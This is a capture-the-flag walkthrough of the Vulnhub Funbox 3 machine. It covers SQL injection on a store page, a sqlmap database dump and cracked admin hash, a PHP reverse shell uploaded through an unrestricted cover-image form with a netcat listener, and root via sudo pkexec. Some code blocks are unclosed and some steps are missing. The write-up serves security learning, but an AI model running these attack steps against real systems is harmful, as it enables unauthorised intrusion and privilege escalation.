It is the third box in the Funbox series. The Funbox series from Vulnhub is a great series for beginners. This box has a great flow, and alot rabbit holes.

Looking back, I really didn't explain my steps here at all, yikes!

### Scanning:

**Checking the secret directory:**

```
crazyeights@es-base:~$ curl http://192.168.56.118/secret/
„Anyone who lives within their means suffers from a lack of imagination.“
Oscar Wilde (*1854 - †1900)
```

*   there are several sites on the server a store, a gym page, and a project management site (?)

*   Started with the book store because it looks like it has the most content (without having to login)

**Book store:**

*   at /store
    
    ![](/assets/images/fb3/fb1.png)
*   book product pages look vulnerable to SQLi
    
    ![](/assets/images/fb3/fb2.png)
*   Trying:
    

`http://192.168.56.118/store/book.php?bookisbn=978-0-321-94786-4 or '1'='1`

Response is:

```
Can't retrieve data You have an error in your SQL syntax; 
check the manual that corresponds to your MySQL server version for the right syntax to use near '1'='1'' at line 1
```

**Using sqlmap to dump database:**

```
crazyeights@es-base:~$ sqlmap -u http://192.168.56.118/store/book.php?bookisbn=978-0-321-94786-4 --dump
[SNIP]

**Cracking admin hash with sqlmap:**

```
Database: store                                                                                                    
Table: admin
[1 entry]
+-------+--------------------------------------------------+
| name  | pass                                             |
+-------+--------------------------------------------------+
| admin | d033e22ae348aeb5660fc2140aec35850c4da997 (admin) |
+-------+--------------------------------------------------+
```

**Logging in as admin:**

*   at /store/admin.php with credentials admin:admin

*   As admin you can upload images for book covers - it doesn't seem to limit you to just images

*   Will try to upload a php reverse shell

![](/assets/images/fb3/fb3.png)   

images are stored:
```
http://192.168.56.118/store/bootstrap/img/
```

*   It would appear that the backend of this site doesn't actually do anything.

*   It just takes a few minutes the file to upload for some reason

*   Start netcat:

```
nc -lvp 1234
```

Click on php-reverse-shell.php
![](/assets/images/fb3/fb4.png)

```
crazyeights@es-base:~$ nc -lvp 1234

*   The SSH password for tony is in the password file

### Logging into SSH as tony:

**Checking html directory:**

I have no idea what the rest of this is for, so many rabbit holes...

```
tony@funbox3:~$ cd /var/www/html

#### Priv Esc:

Finding  commands tony can run with elevated privileges:
```
tony@funbox3:/var/www/html$ sudo -l
Matching Defaults entries for tony on funbox3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

**Interesting:**

```
 pkexec - Execute a command as another user
```

Testing it out:

```
tony@funbox3:~$ sudo pkexec --user root /usr/bin/ls /root
root.flag  snap
```

##### Getting root:

```
tony@funbox3:~$ sudo pkexec --user root /bin/bash -i
root@funbox3:~# 
```

###### Getting the root flag:

```
root@funbox3:~# cd /root
root@funbox3:~# ls
root.flag  snap
root@funbox3:~# cat root.flag
